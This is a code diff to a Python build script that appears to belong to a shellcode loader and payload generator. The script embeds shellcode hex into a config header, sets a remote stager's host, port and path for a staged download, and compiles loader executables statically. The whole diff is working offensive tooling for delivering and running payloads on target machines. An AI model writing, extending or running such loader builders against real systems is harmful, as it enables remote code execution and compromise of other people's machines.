@@ -8,6 +8,7 @@ import os
 from pathlib import Path
 import subprocess
 import sys
+from urllib.parse import urlparse
 
 
 def join_args(arr: list[str]):
@@ -65,7 +66,10 @@ if __name__ == "__main__":
         assert os.path.isfile(args.shellcode_file), f"Shellcode file '{args.shellcode_file}' does not exist."
         config = config.replace('<SHELLCODE_HEX>', Path(args.shellcode_file).read_bytes().hex())
     if args.stager_url:
-        config = config.replace('<STAGER_URL>', args.stager_url)
+        stager_url = urlparse(args.stager_url)
+        config = config.replace('<STAGER_HOST>', stager_url.hostname)
+        config = config.replace('13337', str(stager_url.port))
+        config = config.replace('<STAGER_PATH>', stager_url.path)
         BIN_PAYLOAD_CFLAGS += ' -DSTAGED'
         EXE_PAYLOAD_CFLAGS += ' -DSTAGED'
     Path('bin/config.h').write_text(config)
@@ -109,7 +113,7 @@ if __name__ == "__main__":
             f.write(loader_source)
 
         # Compile loader
-        run_cmd(f"{CC} bin/{loader}.c -o {output_dir / f'{loader}.exe'}")
+        run_cmd(f"{CC} bin/{loader}.c -o {output_dir / f'{loader}.exe'} -static")
 
     print("")
     if ORIG_CWD in output_dir.parents:
